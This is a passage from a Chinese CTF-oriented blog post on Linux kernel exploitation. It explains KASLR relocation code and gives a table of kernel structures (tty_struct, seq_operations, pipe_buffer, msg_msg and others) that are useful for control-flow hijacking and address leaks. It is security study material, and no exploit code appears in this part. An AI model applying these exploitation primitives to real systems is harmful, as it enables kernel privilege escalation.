<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * input_&#123;data,len&#125;: 压缩镜像的起始地址和长度，全局变量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">extract_kernel()</span><br><span class="line">	choose_random_location(input_data, input_len, &amp;output, ..., &amp;virt_addr)</span><br><span class="line">		random_addr = find_random_phys_addr(min_addr, output_size);</span><br><span class="line">		*output = random_addr;</span><br><span class="line">		random_addr = find_random_virt_addr(LOAD_PHYSICAL_ADDR, output_size);</span><br><span class="line">		*virt_addr = random_addr;</span><br><span class="line">	entry_offset = decompress_kernel(outbuf:output, virt_addr, ...)</span><br><span class="line">		__decompress(input_data, input_len, ..., outbuf, output_len, ...)</span><br><span class="line">		handle_relocations(outbuf, output_len, virt_addr)</span><br></pre></td></tr></table></figure></div>
<p>KASLR 的本质是整体内核镜像的随机偏移。可以看到，<code>choose_random_location()</code> 选定的物理地址空间偏移量和虚拟地址空间偏移量分别体现在 <code>output</code> 和 <code>virt_addr</code> 两个地址上。<code>__decompress()</code> 将内核解压缩至 <code>output</code> 地址，此时 <code>output</code> 上承载的就是上文提到的 <code>vmlinux.bin.all</code>。随后 <code>handle_relocations()</code> 开始解析 <code>vmlinux.bin.all</code>，从中找到 <code>vmlinux.relocs</code>，并结合这些重定向信息以及随机偏移，对内核镜像中各个需要重定位的位置实施修改。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">handle_relocations</span><span class="params">(<span class="type">void</span> *output, <span class="type">unsigned</span> <span class="type">long</span> output_len, <span class="type">unsigned</span> <span class="type">long</span> virt_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * ... Each relocation table entry is the kernel</span></span><br><span class="line"><span class="comment">	 * address of the location which needs to be updated stored as a</span></span><br><span class="line"><span class="comment">	 * 32-bit value which is sign extended to 64 bits.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Format is:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * kernel bits...</span></span><br><span class="line"><span class="comment">	 * 0 - zero terminator for 64 bit relocations</span></span><br><span class="line"><span class="comment">	 * 64 bit relocation repeated</span></span><br><span class="line"><span class="comment">	 * 0 - zero terminator for inverse 32 bit relocations</span></span><br><span class="line"><span class="comment">	 * 32 bit inverse relocation repeated</span></span><br><span class="line"><span class="comment">	 * 0 - zero terminator for 32 bit relocations</span></span><br><span class="line"><span class="comment">	 * 32 bit relocation repeated</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * So we work backwards from the end of the decompressed image.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">for</span> (reloc = output + output_len - <span class="keyword">sizeof</span>(*reloc); *reloc; reloc--) 	&#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">	<span class="keyword">while</span> (*--reloc) &#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (reloc--; *reloc; reloc--) &#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注意：此刻解压缩器应该已经在使用虚拟地址，并且（早期）页表已有建立，但这个页表应该实现的是 VA-PA 完全一致的映射，即 VA 的值完全等于 PA。而 <code>.rela.*</code> 节中记录的是内核加载的虚拟地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* arch/x86/kernel/vmlinux.lds.S */</span></span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">	. = __START_KERNEL;</span><br><span class="line">	.text : ... &#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* arch/x86/include/asm/page_types.h */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD_PHYSICAL_ADDR	((CONFIG_PHYSICAL_START ...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __START_KERNEL		(__START_KERNEL_map + LOAD_PHYSICAL_ADDR)</span></span><br><span class="line"><span class="comment">/* arch/x86/include/asm/page_64_types.h */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __START_KERNEL_map	_AC(0xffffffff80000000, UL)</span></span><br></pre></td></tr></table></figure></div>

<p>因此有了 <code>map</code> 这个变量，作用于 <code>extended</code> 上。这个 <code>extended</code> 是（由 <code>.rela.*</code> 记录的）内核镜像中引用了某个全局符号的位置，本应属于<em>内核编译时地址</em>，但由于有链接器脚本，该地址等价于<em>内核加载虚拟地址</em>。由于此刻正在（通过 self map）使用物理地址，因此通过 <code>map</code> 将其转变为<em>带偏移的内核加载物理地址</em>。</p>
<p>最后再对这些内核镜像位置实施修改，添加<em>运行时虚拟地址</em>的随机偏移量。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">handle_relocations</span><span class="params">(<span class="type">void</span> *output, <span class="type">unsigned</span> <span class="type">long</span> output_len, <span class="type">unsigned</span> <span class="type">long</span> virt_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> delta, <span class="built_in">map</span>, ptr;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> min_addr = (<span class="type">unsigned</span> <span class="type">long</span>)output;</span><br><span class="line"></span><br><span class="line">	delta = min_addr - LOAD_PHYSICAL_ADDR;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The kernel contains a table of relocation addresses. Those</span></span><br><span class="line"><span class="comment">	 * addresses have the final load address of the kernel in virtual</span></span><br><span class="line"><span class="comment">	 * memory. We are currently working in the self map. So we need to</span></span><br><span class="line"><span class="comment">	 * create an adjustment for kernel memory addresses to the self map.</span></span><br><span class="line"><span class="comment">	 * This will involve subtracting out the base address of the kernel.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="built_in">map</span> = delta - __START_KERNEL_map;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_ENABLED(CONFIG_X86_64))</span><br><span class="line">		delta = virt_addr - LOAD_PHYSICAL_ADDR;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 64 bit relocation repeated */</span></span><br><span class="line">	<span class="keyword">for</span> (reloc--; *reloc; reloc--) &#123;</span><br><span class="line">		<span class="type">long</span> extended = *reloc;</span><br><span class="line">		extended += <span class="built_in">map</span>; <span class="comment">// 内核镜像中某个使用到全局符号的位置（全局符号被调用处）</span></span><br><span class="line"></span><br><span class="line">		ptr = (<span class="type">unsigned</span> <span class="type">long</span>)extended;</span><br><span class="line">		<span class="keyword">if</span> (ptr &lt; min_addr || ptr &gt; max_addr)</span><br><span class="line">			error(<span class="string">&quot;64-bit relocation outside of kernel!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		*(<span class="type">uint64_t</span> *)ptr += delta; <span class="comment">// 修改镜像中的指令内容，调整全局符号的地址</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="常见结构体的利用"><a href="#常见结构体的利用" class="headerlink" title="常见结构体的利用"></a>常见结构体的利用</h1><table>
<thead>
<tr>
<th>结构体&#x2F;能力</th>
<th>控制流劫持</th>
<th>泄露堆</th>
<th>泄露栈</th>
<th>泄露内核地址</th>
<th>结构体大小</th>
</tr>
</thead>
<tbody><tr>
<td>cred</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>0xa8 (kmalloc-192)</td>
</tr>
<tr>
<td>tty_struct</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>0x2e0 (kmalloc-1024)</td>
</tr>
<tr>
<td>seq_operations</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>0x20 (kmalloc-32)</td>
</tr>
<tr>
<td>subprocess_info</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>0x60 (kmalloc-128)</td>
</tr>
<tr>
<td>pipe_buffer</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>0x280 (kmalloc-1024)</td>
</tr>
<tr>
<td>shm_file_data</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>0x20 (kmalloc-32)</td>
</tr>
<tr>
<td>msg_msg</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>x</td>
<td>0x31~0x1000 (&gt;&#x3D; kmalloc-64)</td>
</tr>
<tr>
<td>timerfd_ctx</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>0xf0 (kmalloc-256)</td>
</tr>
</tbody></table>
<h2 id="system-V-消息队列"><a href="#system-V-消息队列" class="headerlink" title="system V 消息队列"></a>system V 消息队列</h2><h2 id="pipe-管道相关"><a href="#pipe-管道相关" class="headerlink" title="pipe 管道相关"></a>pipe 管道相关</h2><h2 id="io-uring-与异步-IO-相关"><a href="#io-uring-与异步-IO-相关" class="headerlink" title="io_uring 与异步 IO 相关"></a>io_uring 与异步 IO 相关</h2><h2 id="msg-msg"><a href="#msg-msg" class="headerlink" title="msg_msg"></a>msg_msg</h2><h2 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h2>
		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> 深入理解Pwn_Kernel及相关例题</li>
        <li><strong>Author:</strong> 韩乔落</li>
        <li><strong>Created at
                :</strong> 2023-10-16 20:15:29</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-12-18 19:08:07
            </li>
        
        <li>
            <strong>Link:</strong> https://jelasin.github.io/2023/10/16/深入理解Pwn_Kernel及相关例题/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Pwn-Kernel/">#Pwn_Kernel</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2023/10/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">计算机科学中的数学-python实现</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Other%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">深入理解Pwn_Other及相关例题</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'jelasin/jelasin.github.io',
                'data-repo-id': 'R_kgDOKVydDA',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'not-lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">深入理解Pwn_Kernel及相关例题</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A0%88%E5%88%A9%E7%94%A8"><span class="nav-text">内核栈利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#QWB-2018-core"><span class="nav-text">QWB_2018_core</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-text">动态调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2user"><span class="nav-text">ret2user</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kernel-rop-without-KPIT"><span class="nav-text">kernel rop without KPIT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kernel-rop-with-KPIT"><span class="nav-text">kernel rop with KPIT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-2"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kernel-rop-ret2user"><span class="nav-text">kernel rop + ret2user</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-3"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-pt-regs-%E6%9E%84%E9%80%A0-kernel-ROP"><span class="nav-text">利用 pt_regs 构造 kernel ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-4"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E7%89%88%E6%9C%AC%E5%86%85%E6%A0%B8%E5%AF%B9%E6%8A%97%E5%88%A9%E7%94%A8-pt-regs-%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%E7%9A%84%E5%8A%9E%E6%B3%95"><span class="nav-text">新版本内核对抗利用 pt_regs 进行攻击的办法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-4"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dir"><span class="nav-text">ret2dir</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-5"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-5"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RetSpill"><span class="nav-text">RetSpill</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-6"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-6"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MINI-LCTF2022-kgadget"><span class="nav-text">MINI-LCTF2022 - kgadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-7"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-7"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8"><span class="nav-text">内核堆利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#heap-bof"><span class="nav-text">heap_bof</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="nav-text">题目分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-After-Free"><span class="nav-text">Use After Free</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-8"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-8"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Overflow"><span class="nav-text">Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-9"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-9"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tty-struct-%E5%8A%AB%E6%8C%81"><span class="nav-text">tty_struct 劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-10"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-10"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#seq-operations-%E5%8A%AB%E6%8C%81"><span class="nav-text">seq_operations 劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-11"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-11"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#off-by-null"><span class="nav-text">off by null</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-12"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-12"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Arbitrary-Address-Allocation"><span class="nav-text">Arbitrary Address Allocation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-13"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-13"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Page-level-Fengshui"><span class="nav-text">Page-level Fengshui</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-14"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-14"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Page-level-UAF"><span class="nav-text">Page-level UAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-15"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-15"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dirty-Pagetable"><span class="nav-text">Dirty Pagetable</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-16"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-16"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#USMA"><span class="nav-text">USMA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-17"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-17"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#KSMA"><span class="nav-text">KSMA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-18"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-18"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ret2hbp"><span class="nav-text">Ret2hbp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-19"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-19"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-After-Cleanup"><span class="nav-text">Use After Cleanup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-20"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-20"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ret2VDSO"><span class="nav-text">Ret2VDSO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-21"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-21"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kernel-Unlink"><span class="nav-text">Kernel Unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-22"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-22"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2017-babydriver"><span class="nav-text">CISCN2017 babydriver</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-3"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-23"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-23"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#corCTF-2022-Corjail"><span class="nav-text">corCTF-2022 Corjail</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-4"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-24"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-24"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#corCTF2022-cache-of-castways"><span class="nav-text">corCTF2022 cache of castways</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-5"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-25"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-25"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#D-3CTF2023-d3kcache"><span class="nav-text">D^3CTF2023 d3kcache</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-6"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-26"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-26"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RWCTF2022-Digging-into-kernel-1-2"><span class="nav-text">RWCTF2022 Digging into kernel 1 &amp; 2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 